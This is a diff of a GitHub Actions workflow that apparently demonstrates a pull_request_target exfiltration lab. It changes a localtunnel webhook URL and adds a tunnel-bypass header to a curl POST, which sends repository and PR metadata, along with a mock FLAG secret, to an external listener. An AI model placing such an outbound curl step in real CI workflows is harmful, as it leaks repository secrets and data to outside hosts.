@@ -16,8 +16,8 @@ jobs:
       # Simulated Repository Secret (Accessible because trigger is pull_request_target)
       # In GitHub Settings -> Secrets: set DUMMY_SECRET or use fallback mock token
       DUMMY_SECRET: ${{ secrets.DUMMY_SECRET || 'FLAG{gh_actions_pwned_dummy_token_98472}' }}
-      # External Webhook URL (Custom CI/CD Threat Listener via localtunnel)
-      WEBHOOK_URL: ${{ secrets.WEBHOOK_URL || 'https://cyan-women-stop.loca.lt/webhook' }}
+      # External Webhook URL — Custom listener via localtunnel
+      WEBHOOK_URL: ${{ secrets.WEBHOOK_URL || 'https://new-pugs-wink.loca.lt/webhook' }}
 
     steps:
       - name: Display PR Trigger Metadata
@@ -46,6 +46,7 @@ jobs:
             echo "[*] Transmitting simulated telemetry to configured webhook: $WEBHOOK_URL"
             curl -s -X POST "$WEBHOOK_URL" \
               -H "Content-Type: application/json" \
+              -H "bypass-tunnel-reminder: true" \
               -d "{
                 \"event\": \"pull_request_target_exfiltration\",
                 \"repository\": \"${{ github.repository }}\",
@@ -57,7 +58,7 @@ jobs:
                 \"commit_sha\": \"${{ github.event.pull_request.head.sha }}\"
               }" || echo "[!] Webhook transmission encountered a network issue."
             echo ""
-            echo "[+] Outbound transmission completed. Check webhook.site dashboard."
+            echo "[+] Outbound transmission completed. Check your listener dashboard."
           else
             echo "[!] Notice: WEBHOOK_URL secret is not configured in repository settings."
             echo "[*] Simulated payload that would be transmitted:"
